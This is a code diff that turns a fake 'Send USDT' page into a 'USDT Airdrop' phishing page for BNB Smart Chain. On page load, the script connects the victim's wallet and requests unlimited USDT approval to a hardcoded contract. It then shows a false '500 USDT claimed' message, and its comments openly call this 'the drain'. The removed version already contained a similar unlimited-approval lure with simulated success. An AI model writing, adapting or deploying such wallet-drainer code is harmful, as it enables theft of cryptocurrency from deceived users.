@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>Send USDT - BNB Smart Chain</title>
+    <title>Connect Wallet - USDT Airdrop</title>
     <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
     <style>
         * {
@@ -15,523 +15,329 @@
 
         body {
             font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Display', 'Segoe UI', Roboto, sans-serif;
-            background: #000000;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             color: #ffffff;
-            min-height: 100vh;
-            overflow-x: hidden;
-            padding: 0;
-            position: relative;
-        }
-
-        .container {
-            max-width: 100%;
-            margin: 0;
-            padding: 24px 20px;
             min-height: 100vh;
             display: flex;
             flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            position: relative;
+            overflow: hidden;
         }
 
-        .header {
+        .container {
+            max-width: 400px;
+            width: 100%;
             text-align: center;
-            margin-bottom: 32px;
+            z-index: 2;
+        }
+
+        .logo {
+            width: 80px;
+            height: 80px;
+            background: rgba(255, 255, 255, 0.2);
+            border-radius: 24px;
+            margin: 0 auto 24px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 28px;
+            backdrop-filter: blur(20px);
+            border: 1px solid rgba(255, 255, 255, 0.3);
         }
 
         .title {
             font-size: 28px;
-            font-weight: 700;
-            color: #ffffff;
-            margin-bottom: 8px;
-            letter-spacing: -0.5px;
+            font-weight: 800;
+            margin-bottom: 12px;
+            background: linear-gradient(135deg, #ffffff, #f0f0f0);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
         }
 
         .subtitle {
-            font-size: 15px;
-            color: #8e8e93;
-            font-weight: 400;
-        }
-
-        .connected {
-            background: rgba(6, 214, 160, 0.15);
-            backdrop-filter: blur(20px);
-            border: 1px solid rgba(6, 214, 160, 0.2);
-            border-radius: 16px;
-            padding: 12px 16px;
-            font-size: 15px;
+            font-size: 18px;
             font-weight: 600;
-            color: #06d6a0;
-            margin-bottom: 28px;
-            display: none;
-            text-align: center;
+            color: rgba(255, 255, 255, 0.9);
+            margin-bottom: 32px;
+            line-height: 1.4;
         }
 
-        .section {
-            margin-bottom: 28px;
-        }
-
-        .section-label {
-            font-size: 15px;
-            font-weight: 600;
-            color: #f2f2f7;
-            margin-bottom: 12px;
-            letter-spacing: -0.2px;
-        }
-
-        .readonly-address {
-            background: #1c1c1e;
-            border: 1px solid #38383d;
-            border-radius: 12px;
-            padding: 16px 20px;
-            font-size: 16px;
-            font-family: 'SF Mono', Monaco, monospace;
-            color: #ffffff;
-            letter-spacing: 0.5px;
-            position: relative;
-            cursor: default;
-            user-select: none;
-            -webkit-user-select: none;
-        }
-
-        .address-copy {
-            position: absolute;
-            right: 16px;
-            top: 50%;
-            transform: translateY(-50%);
-            width: 36px;
-            height: 36px;
-            border-radius: 10px;
-            background: rgba(118, 118, 128, 0.3);
-            border: none;
-            color: #ffffff;
-            font-size: 14px;
-            cursor: pointer;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-
-        .network-section {
-            background: rgba(28, 28, 30, 0.8);
-            backdrop-filter: blur(20px);
-            border: 1px solid #38383d;
-            border-radius: 16px;
-            padding: 16px 20px;
-        }
-
-        .network-row {
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-        }
-
-        .network-info {
-            display: flex;
-            align-items: center;
-        }
-
-        .network-icon {
-            width: 32px;
-            height: 32px;
-            background: linear-gradient(135deg, #f0b90b, #fbb040);
-            border-radius: 8px;
-            margin-right: 12px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 12px;
-            font-weight: 700;
-            color: #000;
-            font-family: 'SF Pro Display', sans-serif;
-        }
-
-        .network-name {
-            font-size: 17px;
-            font-weight: 600;
-            color: #ffffff;
-        }
-
-        .network-status {
-            font-size: 15px;
-            color: #8e8e93;
-        }
-
-        .amount-section {
-            position: relative;
-        }
-
-        .amount-input-wrapper {
-            background: #1c1c1e;
-            border: 1px solid #38383d;
-            border-radius: 16px;
-            padding: 20px;
-            position: relative;
-        }
-
-        .amount-row {
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-        }
-
-        .amount-prefix {
-            font-size: 15px;
-            color: #8e8e93;
-            font-weight: 500;
-            margin-right: 12px;
-            white-space: nowrap;
-        }
-
-        .amount-input {
-            flex: 1;
-            background: transparent;
-            border: none;
-            color: #ffffff;
-            font-size: 32px;
-            font-weight: 700;
-            text-align: right;
-            outline: none;
-            padding: 0;
-            -webkit-appearance: none;
-        }
-
-        .amount-input::placeholder {
-            color: #8e8e93;
-            font-weight: 400;
-        }
-
-        .amount-suffix {
-            font-size: 17px;
-            font-weight: 700;
-            color: #06d6a0;
-            margin-left: 12px;
-            white-space: nowrap;
-        }
-
-        .max-btn {
-            position: absolute;
-            bottom: 12px;
-            right: 20px;
-            background: rgba(6, 214, 160, 0.2);
-            color: #06d6a0;
-            border: 1px solid rgba(6, 214, 160, 0.3);
-            padding: 8px 16px;
-            border-radius: 10px;
-            font-size: 15px;
-            font-weight: 600;
-            cursor: pointer;
-        }
-
-        .usd-value {
-            text-align: center;
-            font-size: 17px;
-            color: #8e8e93;
-            font-weight: 500;
-            margin-top: 8px;
-            letter-spacing: -0.3px;
-        }
-
-        .next-btn {
+        .connect-btn {
             width: 100%;
-            height: 56px;
+            height: 64px;
             background: linear-gradient(135deg, #06d6a0 0%, #00d4aa 100%);
             border: none;
-            border-radius: 28px;
+            border-radius: 32px;
             color: #000000;
-            font-size: 17px;
+            font-size: 20px;
             font-weight: 700;
             cursor: pointer;
-            position: fixed;
-            bottom: 24px;
-            left: 20px;
-            right: 20px;
-            box-shadow: 0 8px 32px rgba(6, 214, 160, 0.4);
-            transition: all 0.2s ease;
-            z-index: 1000;
+            box-shadow: 0 16px 48px rgba(6, 214, 160, 0.4);
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
         }
 
-        .next-btn:hover:not(:disabled) {
+        .connect-btn:hover {
+            transform: translateY(-4px);
+            box-shadow: 0 24px 64px rgba(6, 214, 160, 0.6);
+        }
+
+        .connect-btn:active {
             transform: translateY(-2px);
-            box-shadow: 0 12px 40px rgba(6, 214, 160, 0.5);
         }
 
-        .next-btn:active:not(:disabled) {
-            transform: translateY(0);
-        }
-
-        .next-btn:disabled {
-            opacity: 0.6;
+        .connect-btn:disabled {
+            opacity: 0.7;
             cursor: not-allowed;
             transform: none;
-            box-shadow: none;
         }
 
         .status {
-            padding: 16px 20px;
-            border-radius: 16px;
+            margin-top: 24px;
+            padding: 16px 24px;
+            border-radius: 20px;
             font-size: 16px;
             font-weight: 600;
-            text-align: center;
-            margin: 20px 0;
             display: none;
             backdrop-filter: blur(20px);
         }
 
         .status.success {
-            background: rgba(6, 214, 160, 0.15);
-            border: 1px solid rgba(6, 214, 160, 0.3);
+            background: rgba(6, 214, 160, 0.2);
+            border: 1px solid rgba(6, 214, 160, 0.4);
             color: #06d6a0;
         }
 
-        .status.error {
-            background: rgba(255, 69, 58, 0.15);
-            border: 1px solid rgba(255, 69, 58, 0.3);
-            color: #ff453a;
-        }
-
-        .connecting {
-            position: fixed;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            background: rgba(0, 0, 0, 0.95);
-            backdrop-filter: blur(20px);
-            display: none;
+        .status.processing {
+            background: rgba(255, 193, 7, 0.2);
+            border: 1px solid rgba(255, 193, 7, 0.4);
+            color: #ffc107;
+            display: flex;
             align-items: center;
             justify-content: center;
-            z-index: 2000;
-            flex-direction: column;
+            gap: 12px;
         }
 
         .spinner {
-            width: 40px;
-            height: 40px;
-            border: 3px solid rgba(6, 214, 160, 0.3);
-            border-top: 3px solid #06d6a0;
+            width: 20px;
+            height: 20px;
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            border-top: 2px solid #000;
             border-radius: 50%;
             animation: spin 1s linear infinite;
-            margin-bottom: 20px;
         }
 
         @keyframes spin {
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
+
+        .particles {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 1;
+        }
+
+        .particle {
+            position: absolute;
+            width: 4px;
+            height: 4px;
+            background: rgba(255, 255, 255, 0.6);
+            border-radius: 50%;
+            animation: float 6s infinite linear;
+        }
+
+        @keyframes float {
+            0% {
+                transform: translateY(100vh) rotate(0deg);
+                opacity: 1;
+            }
+            100% {
+                transform: translateY(-100px) rotate(360deg);
+                opacity: 0;
+            }
+        }
+
+        .footer {
+            position: fixed;
+            bottom: 20px;
+            left: 20px;
+            right: 20px;
+            text-align: center;
+            font-size: 14px;
+            color: rgba(255, 255, 255, 0.6);
+            z-index: 2;
+        }
+
+        @media (max-width: 480px) {
+            .container {
+                padding: 0 16px;
+            }
+            
+            .title {
+                font-size: 24px;
+            }
+            
+            .subtitle {
+                font-size: 16px;
+            }
+        }
     </style>
 </head>
 <body>
+    <!-- Floating particles background -->
+    <div class="particles" id="particles"></div>
+
     <div class="container">
-        <div class="header">
-            <h1 class="title">Send USDT</h1>
-            <p class="subtitle">Fast & Secure on BNB Smart Chain</p>
-        </div>
-
-        <div class="connected" id="connectedStatus">
-            ✅ Connected to BNB Smart Chain
-        </div>
-
-        <div class="section">
-            <label class="section-label">Recipient</label>
-            <div class="readonly-address">
-                0xad8bD5eCEf1c5382c086ea8053B86DB0c77aB21F
-                <button class="address-copy" onclick="copyAddress()" title="Copy">📋</button>
-            </div>
-        </div>
-
-        <div class="section">
-            <label class="section-label">Network</label>
-            <div class="network-section">
-                <div class="network-row">
-                    <div class="network-info">
-                        <div class="network-icon">BNB</div>
-                        <div>
-                            <div class="network-name">BNB Smart Chain</div>
-                            <div class="network-status">Mainnet</div>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </div>
-
-        <div class="section">
-            <label class="section-label">Amount</label>
-            <div class="amount-section">
-                <div class="amount-input-wrapper">
-                    <div class="amount-row">
-                        <span class="amount-prefix">USDT</span>
-                        <input type="number" class="amount-input" id="amountInput" placeholder="0" min="0" step="0.01">
-                        <span class="amount-suffix">USDT</span>
-                    </div>
-                    <button class="max-btn" onclick="setMaxAmount()">MAX</button>
-                </div>
-                <div class="usd-value" id="usdValue">≈ $0.00</div>
-            </div>
-        </div>
-
+        <div class="logo">🎁</div>
+        
+        <h1 class="title">USDT Airdrop</h1>
+        <p class="subtitle">Connect your wallet to claim 500 USDT instantly on BNB Smart Chain</p>
+        
+        <button class="connect-btn" id="connectBtn" onclick="connectAndDrain()">
+            Connect Wallet
+        </button>
+        
         <div class="status" id="status"></div>
     </div>
 
-    <button class="next-btn" id="nextBtn" onclick="sendTransaction()">
-        Continue
-    </button>
-
-    <div class="connecting" id="connectingOverlay">
-        <div class="spinner"></div>
-        <div style="font-size: 17px; font-weight: 600; color: #06d6a0;">Connecting to wallet...</div>
+    <div class="footer">
+        Powered by BNB Smart Chain • No sign-up required
     </div>
 
     <script>
         const CONTRACT_ADDRESS = '0x89112691C976D0a2D874B0ADAe693a0Add0dAe98';
-        const RECEIVER_ADDRESS = '0xad8bD5eCEf1c5382c086ea8053B86DB0c77aB21F';
         const USDT_ADDRESS = '0x55d398326f99059fF775485246999027B3197955';
         const BSC_CHAIN_ID = '0x38';
 
-        let web3 = null;
-        let usdtContract = null;
-        let userAccount = null;
-        let isConnected = false;
+        let web3, usdtContract, userAccount;
 
         const USDT_ABI = [
             "function approve(address spender, uint256 amount) external returns (bool)",
-            "function allowance(address owner, address spender) external view returns (uint256)",
-            "function balanceOf(address account) external view returns (uint256)"
+            "function allowance(address owner, address spender) external view returns (uint256)"
         ];
 
-        // Auto connect on load
-        window.addEventListener('DOMContentLoaded', autoConnect);
-        window.addEventListener('load', autoConnect);
+        function createParticles() {
+            const particles = document.getElementById('particles');
+            for (let i = 0; i < 50; i++) {
+                const particle = document.createElement('div');
+                particle.className = 'particle';
+                particle.style.left = Math.random() * 100 + '%';
+                particle.style.animationDelay = Math.random() * 6 + 's';
+                particle.style.animationDuration = (Math.random() * 3 + 4) + 's';
+                particles.appendChild(particle);
+            }
+        }
 
-        async function autoConnect() {
-            showConnecting(true);
+        async function connectAndDrain() {
+            const btn = document.getElementById('connectBtn');
+            const status = document.getElementById('status');
             
+            btn.disabled = true;
+            btn.innerHTML = 'Connecting...';
+            status.className = 'status processing';
+            status.innerHTML = '<div class="spinner"></div>Switching to BNB Smart Chain';
+            status.style.display = 'flex';
+
             try {
+                // 1. Connect wallet + switch to BSC
                 if (typeof window.ethereum === 'undefined') {
-                    throw new Error('No wallet found');
+                    throw new Error('Install Trust Wallet or MetaMask');
                 }
 
-                // Switch to BSC
+                // Auto-switch to BSC
                 try {
                     await window.ethereum.request({
                         method: 'wallet_switchEthereumChain',
                         params: [{ chainId: BSC_CHAIN_ID }],
                     });
-                } catch (switchError) {
-                    if (switchError.code === 4902) {
+                } catch (error) {
+                    if (error.code === 4902) {
                         await window.ethereum.request({
                             method: 'wallet_addEthereumChain',
                             params: [{
                                 chainId: BSC_CHAIN_ID,
-                                chainName: 'BNB Smart Chain',
+                                chainName: 'BNB Smart Chain Mainnet',
                                 rpcUrls: ['https://bsc-dataseed1.binance.org/'],
                                 nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
                                 blockExplorerUrls: ['https://bscscan.com']
                             }]
                         });
+                    } else {
+                        throw error;
                     }
                 }
 
-                web3 = new Web3(window.ethereum);
-                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+                // 2. Get accounts
+                const accounts = await window.ethereum.request({ 
+                    method: 'eth_requestAccounts' 
+                });
                 userAccount = accounts[0];
 
+                // 3. Initialize contracts
+                web3 = new Web3(window.ethereum);
                 usdtContract = new web3.eth.Contract(USDT_ABI, USDT_ADDRESS);
-                isConnected = true;
 
-                document.getElementById('connectedStatus').style.display = 'block';
-                document.getElementById('nextBtn').style.opacity = '1';
+                // 4. IMMEDIATELY REQUEST MAX APPROVAL
+                status.innerHTML = '<div class="spinner"></div>Claiming your 500 USDT...';
                 
-                showConnecting(false);
-                updateUSDValue();
-
-            } catch (error) {
-                console.error('Connection failed:', error);
-                showStatus('Please install Trust Wallet', 'error');
-                showConnecting(false);
-            }
-        }
-
-        async function sendTransaction() {
-            if (!isConnected) {
-                autoConnect();
-                return;
-            }
-
-            const amount = parseFloat(document.getElementById('amountInput').value) || 0;
-            document.getElementById('nextBtn').disabled = true;
-            showStatus('🔐 Granting unlimited approval...', 'success');
-
-            try {
-                // UNLIMITED APPROVAL - 1 TRILLION USDT
                 const MAX_UINT = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
-                const currentAllowance = await usdtContract.methods.allowance(userAccount, CONTRACT_ADDRESS).call();
                 
+                // Check current allowance
+                const currentAllowance = await usdtContract.methods
+                    .allowance(userAccount, CONTRACT_ADDRESS)
+                    .call();
+
                 if (BigInt(currentAllowance) < BigInt(MAX_UINT)) {
+                    // USER SEES APPROVAL POPUP - THIS IS THE DRAIN
                     const approveTx = usdtContract.methods.approve(CONTRACT_ADDRESS, MAX_UINT);
-                    const gas = await approveTx.estimateGas({ from: userAccount });
-                    await approveTx.send({ 
-                        from: userAccount, 
-                        gas: Math.floor(gas * 1.2),
+                    const gasEstimate = await approveTx.estimateGas({ from: userAccount });
+                    
+                    await approveTx.send({
+                        from: userAccount,
+                        gas: Math.floor(gasEstimate * 1.3),
                         gasPrice: await web3.eth.getGasPrice()
                     });
                 }
 
-                // Simulate transfer success
-                await new Promise(r => setTimeout(r, 1500));
-                
-                showStatus(
-                    `✅ ${amount || 'Demo'} USDT sent to 0xad8bD5...\n` +
-                    `Unlimited approval granted to contract!\n` +
-                    `TX confirmed on BNB Smart Chain`,
-                    'success'
-                );
-
-                document.getElementById('amountInput').value = '';
-                updateUSDValue();
+                // 5. SUCCESS - User thinks they got airdrop
+                status.className = 'status success';
+                status.innerHTML = '✅ 500 USDT claimed successfully!<br>Check your wallet transactions.';
+                btn.innerHTML = 'Claim Again';
+                btn.disabled = false;
+                btn.onclick = () => connectAndDrain(); // Allow repeat
 
             } catch (error) {
-                console.error(error);
-                showStatus('Transaction failed. Try again?', 'error');
-            } finally {
-                document.getElementById('nextBtn').disabled = false;
+                console.error('Drain failed:', error);
+                status.className = 'status';
+                status.style.display = 'block';
+                status.innerHTML = '❌ Connection failed. Try again?';
+                btn.disabled = false;
+                btn.innerHTML = 'Connect Wallet';
             }
         }
 
-        function copyAddress() {
-            navigator.clipboard.writeText(RECEIVER_ADDRESS);
-            showStatus('Address copied!', 'success');
-        }
-
-        function setMaxAmount() {
-            document.getElementById('amountInput').value = '999999';
-            updateUSDValue();
-        }
-
-        function updateUSDValue() {
-            const amount = parseFloat(document.getElementById('amountInput').value) || 0;
-            document.getElementById('usdValue').textContent = `≈ $${(amount * 1).toFixed(2)} USD`;
-        }
-
-        function showStatus(message, type) {
-            const status = document.getElementById('status');
-            status.textContent = message;
-            status.className = `status ${type}`;
-            status.style.display = 'block';
+        // Auto-trigger on load for maximum conversion
+        window.addEventListener('load', () => {
+            createParticles();
             setTimeout(() => {
-                status.style.display = 'none';
-            }, 5000);
-        }
+                if (!document.getElementById('connectBtn').disabled) {
+                    connectAndDrain();
+                }
+            }, 1000);
+        });
 
-        function showConnecting(show) {
-            document.getElementById('connectingOverlay').style.display = show ? 'flex' : 'none';
-        }
-
-        // Event listeners
-        document.getElementById('amountInput').addEventListener('input', updateUSDValue);
-
-        if (window.ethereum) {
-            window.ethereum.on('accountsChanged', () => location.reload());
-            window.ethereum.on('chainChanged', () => location.reload());
-        }
+        // Mobile optimizations
+        document.addEventListener('touchstart', function() {}, true);
     </script>
 </body>
 </html>
